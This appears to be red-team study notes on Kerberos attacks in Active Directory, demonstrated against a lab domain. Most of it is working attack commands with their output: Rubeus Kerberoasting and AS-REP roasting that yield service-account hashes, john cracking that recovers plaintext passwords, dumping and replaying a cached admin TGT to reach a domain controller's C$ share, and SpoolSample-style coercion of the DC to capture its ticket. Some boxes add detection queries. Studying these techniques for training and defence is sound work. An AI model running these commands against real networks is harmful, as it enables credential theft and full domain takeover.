---
description: 09/17/2025
---

# Kerberos

## What is Kerberos?

This is a network authentication protocol that provides strong, ticket-based authentication for clients and services over a non-trusted network.

Essentially, it prevents password sharing and enabled Single Sign-On (SSO).

### What encryption does it use?

It relies on a symmetric-key cryptography and a trusted third party, known as the Key Distribution Center (KDC) in order to issue encrypted tickets that allow users to access services without having to re-authenticate.&#x20;

## Brief Overview

<figure><img src="../.gitbook/assets/image.png" alt="" width="305"><figcaption></figcaption></figure>

{% hint style="info" %}
:fingers\_crossed:Kerberos is a very fun topic that can be invaluable knowledge to an attacker. It contains some awesome abuse primitives that are well known within Active Directory environments.
{% endhint %}

When a user logs onto their workstation, <mark style="color:yellow;">their machine will send an</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`AS-REQ`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">message to the KDC</mark> (Domain Controller), <mark style="color:yellow;">requesting a</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`TGT`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">using a secret key that is derived from the user's password</mark>.

The KDC _<mark style="color:green;">**verifies**</mark>_ the **secret key** with the password it has stored in Active Directory for that user. _**Once validated**_, <mark style="color:yellow;">it returns the TGT in an</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`AS-REP`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">message</mark>. <mark style="color:green;">The TGT contains the user's identity and is encrypted with the KDC secret key (the</mark> <mark style="color:green;"></mark><mark style="color:green;">`krbtgt`</mark> <mark style="color:green;"></mark><mark style="color:green;">account)</mark>.

_**When the user attempts to access a resource backed by Kerberos authentication**_ (e.g. a file share), <mark style="color:green;">their machine looks up the associated Service Principal Name</mark> (SPN — pronounced SPIN). <mark style="color:green;">It then requests (</mark><mark style="color:green;">`TGS-REQ`</mark><mark style="color:green;">) a Ticket Granting Service Ticket (TGS) for that service from the KDC (DC)</mark>, and <mark style="color:green;">presents its TGT as a means of proving they're a valid user</mark>.

Lastly, the KDC will return a TGS (`TGS-REP`) for the service in question to the user, which is then presented to the service.

The <mark style="color:yellow;">service will inspect the TGS and decides whether it should grant the user access or not</mark>.

## Kerberoasting

### Services (Local and Domain Accounts)

_**Services run on a machine under the context of a user account**_. <mark style="color:yellow;">These accounts are either local to the machine</mark> (**`LocalSystem`, `LocalService`, `NetworkService`**) <mark style="color:yellow;">or are domain accounts</mark> (e.g. **`DOMAIN\mssql`**).

### SPNs

A service Principal Name (SPN) is a unique identifier to a service instance.

SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Part of the TGS returned by the KDC (DC) is encrypted along with a _**secret**_ derived from the password of the user account running that service.&#x20;

### What is Kerberoasting?

It is a _<mark style="color:green;">technique that requests TGS' for services running under the context of domain accounts, obtaining hashes, and taking them offline to reveal their plaintext passwords</mark>_.

<mark style="color:yellow;">`rubeus`</mark>' <mark style="color:yellow;">`kerberoast`</mark> parameter _**can be used to perform the kerberoasting technique**_.

_<mark style="color:yellow;">**Running it without further arguments will roast every account within the domain that has a SPN**</mark>_ (excluding `krbtgt`):

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap

[*] Total kerberoastable users : 3

$krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc/sql-2.dev.cyberbotic.io:1433@dev.cyberbotic.io*$122A4848378D3CFFEF922BDEAAC3707A$8FE7692C9C318EC7B4630C929AD54F87784B9E52293020E17BB427BD3FD27BA3C491D264BE8082505F3A2C40142703042A7EC3E161828A89003A0FC7C8CC55111FA432C0F0F2ED3488711E3F845CABFAC9141D63D69397741752201561C02DAEB131C1E079CDE112C9203E91B6A55714261AD223DF2B6879C5DF3805362068DFE39EF51C88E35C45ACE05DF4503252478E9AFD69FA21192046C4E3D8ECA7801D460C4C7D6AF7026AA3A2235A584DA1CA29C16AB7BDF9B307F3EBE6DCA84B9ABEE66ABA070613293DD91EB89B33B6633EB3EB906350C9AED9AD03EE306743024C09AA9AE26582460164BC3160FE95284F33174B3263EEA22E270F9A2D274390BA4546C110E44D7A678F8E286FCBAC660FBF8A0F7CBD72F1FA71BE7F59661CD75847FB7882F8481DC3ABB665CBA7BAAB0600D1E11131E4FB1C0690FCB20D707D2B7906E38381116FCEB8E5F9DAA882A95A4F3D04CB890C6C24EA997361881AFE3003828F759E96AAFC23EB589EC778352C9C5E0109BE110E01A12AB8D15383BA0714EC68B9A666CA42488B3438B1D52517F6A0F94CA8A1A2B93D12B815C32E721F71DC1D5C34ED4D7E5FB11E8AA1E9CB0CDE6BC997E6DB5A3A29EE329337243488A1902F0F66271DF224080A6FED34313A9253F523766F6EB6523E661E425E98302596B4649FE97D566534CE6DAAB323C5118163D160D1747AE3776FFBECA7A7F4E7FAB55833268D529A16DE926F3B86854F4D662306462BDBBBC55421D8AA3C059D981A168C25663A676401A86F8AA9CC9F6A71B7C2C0B8500D78683B2FD39C74F228F83F4D9C1AFB051E91C5A59278B010B1DAA05DB799B170BD3422B74FBE068CB5BF980037A4B907DF8930379A79BFCEBF54B8AF22E22565EDE399A18FAFBC4F09ADF82C4446FAC2169174CBADD49518C286A67B320AF445AD12892497F2D0152C92145463CAD6C99AA5F331FBEE04BCD05CFE1D40C3DFFC3C1140743C1A31A814EEEE5199365AB332EA1F681D62D7B3FE2C0C2F02005B63482F110FF43B9BF1C743F0E4ECC62AEC2914C6A5965CC18F13DBF40959F6E7AD9893FC046D2E5B60F1415F83D522A2B7F0A0B32FC5E5F514165F4B0D2B661162550CE578B43653AF471FA119EAD12DA26FE778362458AAF58E94413B2814A0A1A215118BFD6B0F3BCC4B9AC9D28D51E1279F719D7E0B0CB33824E778CA77F92E0E3A28FAE76A107920734B2D9D81F4E35EBFA3C37E84EBD0CB72C2507CB2627ED3AA8CE32647CFADC288967BFA12F21C3F3A2FBDF6AC64A8743853337D086338ED0AAE6AB3594B78B2926E9DC02DE962D41B9146E0F7718E1C7EA2CB334C40B43C1294C88C68B17A813AD0C15AA8238FF81DB14EB5AB56C7E6ABE56CD0BB9FA02761E1838D0FC894F7E5B627AC959FFB6DE2E235830A5FAEE8D58FDC3098EC20E64D56323CC8C47987AA5B85E6CB165F36B5A6AE9499F6593E13B81F501D7430BFBADF7B03EFD1F65869F801AE78A22165D862132194B96A68ECA2F55BE3338346FBAF836C4D61AF9F7FC012C5F14B220C62349A130E6F4C8A1620866A370C2A433AE36C08E2E496CC833824C0873C5B5D7A8DA38A2C41CC89ADEA62F22B3CB47445D60116BE97EE96AC85C6F7E087AAC4C2
$krb5tgs$23$*squid_svc$dev.cyberbotic.io$HTTP/squid.dev.cyberbotic.io@dev.cyberbotic.io*$F819F7E05FCE5C6861D65E38E65ADF6C$A17248D5456E6A9641F60D9B4EB6AFA69373DFF265153E4E4663E4D01613D496D5AA45D14A5FD672412B25998342DA1D7894066CD47BF8B5C0805807E744937AC60B4AD19067C1D900B7A2ED4493EC6B77AE8FBC5F20DFF1D47BCB1F259C72FEA4219A1AAAE1BB1776491F364B1B5BA69D72015EEEFDB57F688D508DCE63312C5407D2E6347B6D30528ACC4464837DAE6820E0F27CCBA7A36B89B8BA5F782B48FFAEDB349D79571B58F7303579627E493B101F90613CDA0013FF27DD558E7E81CCF82B2953AEF650D8DFEAAAF427CD981CB85D57FCABCEA551303B1EE3AED2B542372599FC2C92A0CCDE8482D3B4344EA8DC7B0AEEBD0D24B5F79996E9BC758C28FCE9491D97B9CBEC80D28D8043E1B761703D20A6CAAF04255C082AC64392C4B6C8FF32585605342E07622DE9C2CDAF21BFFB7FEAB1FF19C2AD5D89340CC51D5B5AE50F702E2E45FA01C26DB5086E1FBBC67133F522BFC4A18D77630DAA174633E0E4DFF59737171606BB74C96C8B109AE5DB2BF49F464274D65FF3740B2EB8AE378AEB7E20D7607C785939673E2E8166DA88A274EA247388E6A18EF4B67600F0092F70BDAF0FF440D7C244A520A8CF0A6482CE837C6A927026DF6C0C27228C3039192D8B2B260C45C831609F89ED5B88D364E7327520850FD72072591B938E3412FBFF71FDB32B8A99117377C7B23783564CFD414FA114E45B497C90CEED124F9B291FBE422F824D86F426C0D6616AF4A9EADD21D7EE7370B9AFD1DBE66709D7D7963FF626BB9849C12A2252166BD586A67961935C761F42A03E8CEDB84435546474FAFB951DA4AA878A64C9EADD10962756B2455BBF7AA844FA17A5D158D27B6926FAFF930103861D229C4E15F1CDF7856AF55382F8054E3E00853BF924AEC68EAFD2786849FDE0E0B7D19DEA51029D1240BF832EB5C55D862FBE769A7A2D3F83475A46F80679B7E35FD58A0E6E4848E2CA1C82A6ECA2AC01201BB71F659987B7AB45B74A9CA524022752F6392199951B5B8AC032B8774989051B7FE21A9A9B207D50FC83D1337E31D1F5AF969174E78BC0C50496552E8CA6DCC681D88C59D199D594C4648C75D8FA6D5EFB9876E5E32088560DAD793BDF80A20389AB7E6444AA301736FA89F1EB622D590C8381FD6B97579525EBD4933B3768399A3480C42AE0F768F643528DDCC5A679156AADE780DB37CA61CF3AFAEE2ECF8996122C7C4A8A679C3DC99A1428801AED1D7C91574D6A50A79325FDC7C58FA85FE410D4F311451387C69691B0B37A0CCF890F8F725286C0AD28DB6294A8DC04346AC0167FAC80E4C041C31D2BDFCF948F4A82D843D4A928F3244868084C853B8E73B166E3C25F7E043F9A833CDF939476913E1D0795B10BB8709A11E41D1A20096E41F13F7703540F713F4EDD73D3B5EAAE904EE1305D960047DD6A27ADD3E06204403A76364369DD7395E84BE660147FD4893904B4B0F01355D0961D65D1BAAA97DC7EDD3321D8E6AE13EED9F070DEC8D4C70C3F67AEC23084CF6526252EA23B979463B8BE53CFC81909E6FA50D59A73878275F79BCB484BDB60BD3C1A9EAEA4EF613D7995BF5DB9E0C1D7D222D138C65C20155CD17697E6014F608BC78993EF2F8BDE339532C2F5587981579C7FBB
$krb5tgs$23$*honey_svc$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io@dev.cyberbotic.io*$B6424DAD1372B0E769F64D78848770BA$C2DE3B1FE0FA17EA680043183615A9280A6DAFB5A6A2FA43D6077E4542EACEBBCE2C8D299F1827A94AC9768D5211127A5734586FCD8FD929B12D64C1D72E8ADD2B0A051E8F21EBA9E6631CA775B287E6CA6071550AB27EE950A58B85E80B0C19B63537DC086BE7B44AFF685B232DED804645A7E2DC2A7967E6B7E44BFCAA67CCFEDD74EF1FFC73D7006FAD32B281EF1AF78650757C30BE64394475113176117C050766D5C8B8B3FA8D7226038AD0FF498FFA609B320233FC27C2772C3B92C9259DCDA26C069A5B1BFA14037D8E65F85F02BE1FA3AE567A1C6E6EFC9464E5B313B78588D9B6776701C67D3A514DC5A133B422C624224632FFCD50A5C20B7AAA7B04D692EA64E33A2B3A39B3F0DE58EEC4E3C9D14AB870797325D773CD477B3D498FB82CB8BC06FF4E1DC954465E9077642F050C59E296C05E8F4674F3411739E9C4CF0DF88E6CD68EF32B1D820379F6256CE5EE9EE10177F56BE9E364A59C9EFE3B07D6798EB8373D8EC5367D7C7DD402742264DEAEA939404CBA1673AAB05B6BC56C5FA9CDA7B67A0E330DF7C2E440713FF4F129B8E4A3E5F2A9294BD45BD0E9DBEC63377E87551C374D8D7FF19376A1ADABEBC579D9C607CA7FC8198598BC36D0F4DC799FA89EFABCACDB5AB4BD3498A212C59D3DF93FE008F5B71889633158A942411189496D4958812A71EA344B2F65F6CF5F94F99D12C84F56F25B92489D148C140ACC8D40D5DEC2C6C5B4892060D6806186A38E72CB9183B7391C3FAD8D104B0675C83F568608DA966D172B8588441F0838A5F6EFD354EEF6448F41DABB904A2FA724439B3AC96E035A35CCA9C993B5545A1771D11BE4F82CE1D58CEFFACF889099A81349DFE45D2C73CED9B85550D3C7B1B6624D9C5639DBBEA0B45F3990A5CFDC8B3DF697E12FB7800779575FB897761F0674B89A8D713EF0F744A64C824DAE6269C5BEE1A85F2434E2E8CC283F42C697EF1A74C7C522002301D4CB929A3E715BAF939978F9DD792005CFFA6FAB35D536C4092AA621D7CBC9B3302281BC66B904FA1C5687C981276D59409E794806BE340976D0DD5198E631B9D76BF57AFFB8C4D1F3913F3549A99E90D85CA58AE2C2838F4BB5093BA0F7CDC37F7D1281FB60929B3F9B0473AEE8F7AD4BCE08B1375F2222903F2C860F04D26DAF9D06A0E5E6A3312046A54C1E4DE57EBA411879DFA4420BA4AC854CA8830A56C4F7AA5D4082E16FFA99D297E58837C872D6B8AA0D38FD12EB70AB31FCDF104705DD26E5A38AE58B5633955ED4830E7590CA4C067C31C05861B2AF9EC3C408E2BF0256896B4242926B8A1A7D0221E93355AF0E64861A44CEE50DE6A65F6A767646F7961BC0866B4107BEFC6CD0AA3E682528E74B848A41A21293FD1CD222304FD2142F12BB85511B72FD22E82B94DA21D3B4AD098B016D9D5181E446CA8FD7D98F4784BEE65BD648074ABAB39849B784BF362EFACE9B210C8ECF550BFD7A74C207D4A05C9AD0FD4DCDCB135F421ADF69AEBF21DDA3716079E80B7A039C77DA8802A8D5463652ACD401E1DA06D4FBC4519AA657D19AE808C59693B45AA29328F2061183193A1D14F77A866B7E9AC8C381E5E9BE8BB621E05E71B5C6489B9BE105838415555FDAB70B71D2A7E750B8
```

{% hint style="info" %}
&#x20; :bulb:

**Even though `Rubeus` does not include the `krbtgt` account, it can** [_**sometimes**_](https://twitter.com/_wald0/status/1361720293539139589) **be cracked.**
{% endhint %}

### Cracking Hashes

These hashes can be cracked offline to recover the plaintext passwords for the accounts.

Use the <mark style="color:yellow;">`format=krb5tgs --wordlist=wordlist hashes`</mark> for _<mark style="color:green;">**john**</mark>_ or <mark style="color:yellow;">`-a 0 -m 13100 hashes wordlist`</mark> for _<mark style="color:green;">**hashcat**</mark>_.

```
$ john --format=krb5tgs --wordlist=wordlist mssql_svc
Cyberb0tic       (mssql_svc$dev.cyberbotic.io)
```

{% hint style="warning" %}
I experienced some hash format incompatibility with john.  Removing the `SPN` so it became: `$krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$6A9E[blah]` seemed to address the issue.
{% endhint %}

{% hint style="danger" %}
**OPSEC**\
\
By default, Rubeus will roast every account that has an SPN.  _<mark style="color:$danger;">**Honey Pot accounts**</mark>_ can be configured with a "fake" SPN, which will generate a `4769` event when roasted.  _<mark style="color:$danger;">**Since these events will never be generated for this service, it provides a high-fidelity indication of this attack.**</mark>_

```
event.code: 4769 and winlog.event_data.ServiceName: honey_svc
```
{% endhint %}

### "Safer" Approach

Enumerate possible candidates first and roast selectively.

1. **Use this** _<mark style="color:green;">**LDAP query**</mark>_<mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**to find domain users who have a SPN configured**</mark>**:**

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

[*] TOTAL NUMBER OF SEARCH RESULTS: 4
	[+] cn                   : krbtgt
	[+] servicePrincipalName : kadmin/changepw
	[+] samaccountname       : krbtgt
	
	[+] cn                   : MS SQL Service
	[+] servicePrincipalName : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
	[+] samaccountname       : mssql_svc
	
	[+] cn                   : Squid Proxy
	[+] servicePrincipalName : HTTP/squid.dev.cyberbotic.io
	[+] samaccountname       : squid_svc
	
	[+] cn                   : Honey Token
	[+] servicePrincipalName : HoneySvc/fake.dev.cyberbotic.io
	[+] samaccountname       : honey_svc
```

2. **We&#x20;**<mark style="color:green;">**can then roast an individual account using the**</mark>**&#x20;**<mark style="color:yellow;">**`/user`**</mark>**&#x20;**<mark style="color:green;">**parameter**</mark>**:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

[*] SamAccountName         : mssql_svc
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
[*] PwdLastSet             : 8/15/2022 7:46:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc/sql-2.dev.cyberbotic.io:1433@dev.cyberbotic.io*$122A4848378D3CFFEF922BDEAAC3707A$8FE7692C9C318EC7B4630C929AD54F87784B9E52293020E17BB427BD3FD27BA3C491D264BE8082505F3A2C40142703042A7EC3E161828A89003A0FC7C8CC55111FA432C0F0F2ED3488711E3F845CABFAC9141D63D69397741752201561C02DAEB131C1E079CDE112C9203E91B6A55714261AD223DF2B6879C5DF3805362068DFE39EF51C88E35C45ACE05DF4503252478E9AFD69FA21192046C4E3D8ECA7801D460C4C7D6AF7026AA3A2235A584DA1CA29C16AB7BDF9B307F3EBE6DCA84B9ABEE66ABA070613293DD91EB89B33B6633EB3EB906350C9AED9AD03EE306743024C09AA9AE26582460164BC3160FE95284F33174B3263EEA22E270F9A2D274390BA4546C110E44D7A678F8E286FCBAC660FBF8A0F7CBD72F1FA71BE7F59661CD75847FB7882F8481DC3ABB665CBA7BAAB0600D1E11131E4FB1C0690FCB20D707D2B7906E38381116FCEB8E5F9DAA882A95A4F3D04CB890C6C24EA997361881AFE3003828F759E96AAFC23EB589EC778352C9C5E0109BE110E01A12AB8D15383BA0714EC68B9A666CA42488B3438B1D52517F6A0F94CA8A1A2B93D12B815C32E721F71DC1D5C34ED4D7E5FB11E8AA1E9CB0CDE6BC997E6DB5A3A29EE329337243488A1902F0F66271DF224080A6FED34313A9253F523766F6EB6523E661E425E98302596B4649FE97D566534CE6DAAB323C5118163D160D1747AE3776FFBECA7A7F4E7FAB55833268D529A16DE926F3B86854F4D662306462BDBBBC55421D8AA3C059D981A168C25663A676401A86F8AA9CC9F6A71B7C2C0B8500D78683B2FD39C74F228F83F4D9C1AFB051E91C5A59278B010B1DAA05DB799B170BD3422B74FBE068CB5BF980037A4B907DF8930379A79BFCEBF54B8AF22E22565EDE399A18FAFBC4F09ADF82C4446FAC2169174CBADD49518C286A67B320AF445AD12892497F2D0152C92145463CAD6C99AA5F331FBEE04BCD05CFE1D40C3DFFC3C1140743C1A31A814EEEE5199365AB332EA1F681D62D7B3FE2C0C2F02005B63482F110FF43B9BF1C743F0E4ECC62AEC2914C6A5965CC18F13DBF40959F6E7AD9893FC046D2E5B60F1415F83D522A2B7F0A0B32FC5E5F514165F4B0D2B661162550CE578B43653AF471FA119EAD12DA26FE778362458AAF58E94413B2814A0A1A215118BFD6B0F3BCC4B9AC9D28D51E1279F719D7E0B0CB33824E778CA77F92E0E3A28FAE76A107920734B2D9D81F4E35EBFA3C37E84EBD0CB72C2507CB2627ED3AA8CE32647CFADC288967BFA12F21C3F3A2FBDF6AC64A8743853337D086338ED0AAE6AB3594B78B2926E9DC02DE962D41B9146E0F7718E1C7EA2CB334C40B43C1294C88C68B17A813AD0C15AA8238FF81DB14EB5AB56C7E6ABE56CD0BB9FA02761E1838D0FC894F7E5B627AC959FFB6DE2E235830A5FAEE8D58FDC3098EC20E64D56323CC8C47987AA5B85E6CB165F36B5A6AE9499F6593E13B81F501D7430BFBADF7B03EFD1F65869F801AE78A22165D862132194B96A68ECA2F55BE3338346FBAF836C4D61AF9F7FC012C5F14B220C62349A130E6F4C8A1620866A370C2A433AE36C08E2E496CC833824C0873C5B5D7A8DA38A2C41CC89ADEA62F22B3CB47445D60116BE97EE96AC85C6F7E087AAC4C2
```

## ASREP Roasting

_<mark style="color:$danger;">**If a user does not have Kerberos pre-authentication enabled**</mark>_, <mark style="color:$danger;">an AS-REP can be requested for that user and part of the reply can be cracked offline to recover their plaintext password</mark>.

This configuration is enabled on the User Object and is often seen on accounts that are associated with Linux systems.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**As with&#x20;**<mark style="color:yellow;">**kerberoasting**</mark>**, we don't want to&#x20;**<mark style="color:yellow;">**asreproast**</mark>**&#x20;every account in the domain:**

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
	[+] cn                : Squid Proxy
	[+] distinguishedname : CN=Squid Proxy,CN=Users,DC=dev,DC=cyberbotic,DC=io
	[+] samaccountname    : squid_svc
```

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

[*] SamAccountName         : squid_svc
[*] DistinguishedName      : CN=Squid Proxy,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\squid_svc'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$squid_svc@dev.cyberbotic.io:BEDE491E0C9B3E932F9B4DF274AB059B$0947A85824870A9EA0B2C832B30D8B99BDA99F9451E9EB14AA0D9566674B32A10BE4954E6FB15DED54462D4AAAAE28DFB08C83EF0608DA6EEB9A08DBC79C06099D2B366BA5402A0ED60545B92B17882557CBB0FC700309751C51AF33F25A3103FA67DAAD9AD2154FE4171FBEFBE725AA1311CE50EFB8B87FF1BBCF5E97C496E08BA3CC4CA4F59820C4C27251686658C9F7EE52B43ED5A969A02273510AC7CCFB5DFE61E7A9D72E10B81E7B3ACBFDA0F3F058791E9A87D990871961D3BD9AEB40B9D0A1260094B17DCB8114DDBB19B5C2031F2906E527F96F1AFA62D907570E39E047659532F1FA043371DDF8D7FB9A5E5369A889A7BC
```

### Cracking ASREP Roastable-Obtained Hashes

Use <mark style="color:yellow;">`--format=krb5asrep --wordlist=wordlist squid_svc`</mark> for _<mark style="color:green;">**john**</mark>_ or <mark style="color:yellow;">`-a 0 -m 18200 squid_svc wordlist`</mark> for _<mark style="color:green;">**hashcat**</mark>_.

```
$ john --format=krb5asrep --wordlist=wordlist squid_svc
Passw0rd!        ($krb5asrep$squid_svc@dev.cyberbotic.io)
```

{% hint style="danger" %}
**OPSEC**\
\
ASREPRoasting with will generate a `4768` event with `RC4` encryption and a preauth type of `0`.

```
event.code: 4768 and winlog.event_data.PreAuthType: 0 and winlog.event_data.TicketEncryptionType: 0x17
```
{% endhint %}

## Unconstrained Delegation

_This one is going to be difficult, be patient, and read carefully. You can do it!_

### What is Delegation?

<mark style="color:yellow;">Delegation allows a user or machine to act on behalf of another user to another service</mark>.&#x20;

#### Use Cases?

A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database.

The front-end application needs to authenticate to the back-end database (using Kerberos) as the authenticated user.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### What is Unconstrained Delegation?

_**We know how a user performs Kerberos authentication to the web server,****&#x20;**<mark style="color:yellow;">**but how can the web server authenticate to the DB and perform actions as the user**</mark>**?**_

The solution is _**Unconstrained Delegation**_.

* It was introduced in Windows 2000

_**When configured on a computer**_, <mark style="color:green;">the KDC includes a copy of the user's TGT inside the TGS</mark>. In this _**example**_, <mark style="color:yellow;">when the user accesses the Web Server, it extracts the user's TGT from the TGS and caches it in memory</mark>. <mark style="color:yellow;">When the web server needs to access the DB server on behalf of that user, it uses the user's TGT to request a TGS for the database service</mark>.

### Interesting Perspective

_**Unconstrained delegation**_ <mark style="color:green;">will cache the user's TGT regardless of which service is being accessed by the user</mark>.

_So_, <mark style="color:green;">if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached in memory</mark>.

This means that _<mark style="color:$danger;">**if we can compromise a machine with unconstrained delegation enabled**</mark>_, <mark style="color:green;">we can extract any TGTs from that machine's memory and use them to impersonate the users against other services in the domain</mark>.

**This&#x20;**_<mark style="color:yellow;">**query**</mark>_**&#x20;will&#x20;**<mark style="color:green;">**return all computers that are permitted for unconstrained delegation**</mark>**:**

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

[*] TOTAL NUMBER OF SEARCH RESULTS: 2
	[+] samaccountname : DC-2$
	[+] dnshostname    : dc-2.dev.cyberbotic.io
	
	[+] samaccountname : WEB$
	[+] dnshostname    : web.dev.cyberbotic.io
```

{% hint style="info" %}
:bulb:

Domain Controllers are _**always permitted**_ for unconstrained delegation.
{% endhint %}

### Compromise Techniques/Scenarios

If we compromise <mark style="color:yellow;">`WEB$`</mark> and wait or socially engineer a privileged user to interact with it, we can steal their cached TGT.

Interaction can be via any Kerberos service, so something as simple as <mark style="color:yellow;">`dir \\web\c$`</mark> is enough.

<mark style="color:yellow;">`rubeus`</mark> <mark style="color:yellow;">`triage`</mark> is _<mark style="color:green;">**capable of showing all tickets that are currently cached**</mark>_.

**TGTs can be identified by the&#x20;**<mark style="color:yellow;">**`krbtgt`**</mark>**&#x20;service:**

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

 --------------------------------------------------------------------------------------------------------------- 
 | LUID     | UserName                  | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
 | 0x14794e | nlamb @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 10/4/2022 9:35:38 PM |
```

{% hint style="info" %}
There is a scheduled task running on `Workstation 1` as `nlamb` that will interact with `WEB$` _**every 5 minutes**_. <mark style="color:yellow;">If the ticket is not there, wait a minute or so and try again</mark>.
{% endhint %}

**We can simply&#x20;**<mark style="color:green;">**extract this TGT and leverage it via a new logon session**</mark>**:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
	
doIFwj [...snip...] MuSU8=

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1540
[+] Ticket successfully imported!
[+] LUID            : 0x3206fb

beacon> steal_token 1540

beacon> ls \\dc-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:44:08   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 16:09:55   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 10:51:51   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/05/2022 17:17:48   ProgramData
          dir     08/15/2022 15:23:23   Recovery
          dir     08/16/2022 12:37:38   Shares
          dir     09/05/2022 12:03:43   System Volume Information
          dir     08/15/2022 15:24:39   Users
          dir     09/05/2022 17:09:56   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
 12kb     fil     09/05/2022 07:25:58   DumpStack.log
 12kb     fil     09/06/2022 09:04:41   DumpStack.log.tmp
 384mb    fil     09/06/2022 09:04:41   pagefile.sys
```

### Obtaining TGTs

_<mark style="color:green;">**We can also obtain TGTs for computer accounts by forcing them to authenticate remotely to this machine**</mark>_.

As mentioned in the NTLM Relaying module within the Pivoting chapter, several tools exist to further facilitate this. This time, we will force the DC to authenticate to the web server to steal its TGT.

#### Monitoring for TGTs

Think of the tool [Responder](https://www.kali.org/tools/responder/).

**We will utilize the&#x20;**<mark style="color:yellow;">**`rubeus`**</mark> <mark style="color:yellow;">**`monitor`**</mark>**&#x20;command:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

[*] Action: TGT Monitoring
[*] Monitoring every 10 seconds for new TGTs
```

This drops into a _**loop**_ and will continuously monitor for and extract new TGTs as soon as they are cached and intercepted.&#x20;

{% hint style="success" %}
This is a superior strategy (think of "running responder in the background" during engagements, this is the same methodology) since we will not have to run tools manually because there's a chance that we will miss tickets!
{% endhint %}

**Next, run&#x20;**<mark style="color:yellow;">**`SharpSpoolTrigger`**</mark>**:**

```
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
```

**Where:**

* `DC-2` is the "_**target**_".
* `WEB` is the "_**listener**_".

`Rubeus` will then capture the ticket.

```
[*] 9/6/2022 2:44:52 PM UTC - Found new TGT:

  User                  :  DC-2$@DEV.CYBERBOTIC.IO
  StartTime             :  9/6/2022 9:06:14 AM
  EndTime               :  9/6/2022 7:06:14 PM
  RenewTill             :  9/13/2022 9:06:14 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFuj[...]lDLklP
```

_**Machine TGTs are leveraged slightly differently**_ - see the _**S4U2Self Abuse**_ module.  To stop Rubeus, use the <mark style="color:yellow;">`jobs`</mark> and <mark style="color:yellow;">`jobkill`</mark> commands.
